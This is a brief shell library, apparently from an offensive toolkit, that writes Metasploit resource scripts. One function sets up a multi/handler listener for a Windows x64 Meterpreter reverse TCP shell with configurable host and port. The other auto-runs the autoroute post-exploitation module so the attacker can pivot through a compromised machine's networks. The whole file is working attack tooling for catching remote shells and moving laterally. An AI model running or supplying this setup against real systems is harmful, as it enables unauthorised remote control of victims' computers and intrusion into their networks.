# This msfresourcegeneration.sh file is developed as an shell library, Never run this file alone

# handles network stuff
source sourcelib/networkpref.sh

# handles colors  stuff
source sourcelib/colors.sh

# creates payload handler file
writePayloadHandler()
{
  echo "use exploit/multi/handler" > resource-scripts/payloadhandler.rc
  echo "set payload windows/x64/meterpreter/reverse_tcp" >> resource-scripts/payloadhandler.rc
  echo "set lhost ${LOCALHOST}" >> resource-scripts/payloadhandler.rc
  echo "set lport ${LOCALPORT}" >> resource-scripts/payloadhandler.rc
  echo "set verbose true" >> resource-scripts/payloadhandler.rc
  echo "set AutoRunScript resource-scripts/routehandler.rc" >> resource-scripts/payloadhandler.rc
  echo "exploit" >> resource-scripts/payloadhandler.rc

}

# creates route handler file
writeRouteHandler()
{
  echo run post/multi/manage/autoroute > resource-scripts/routehandler.rc
}
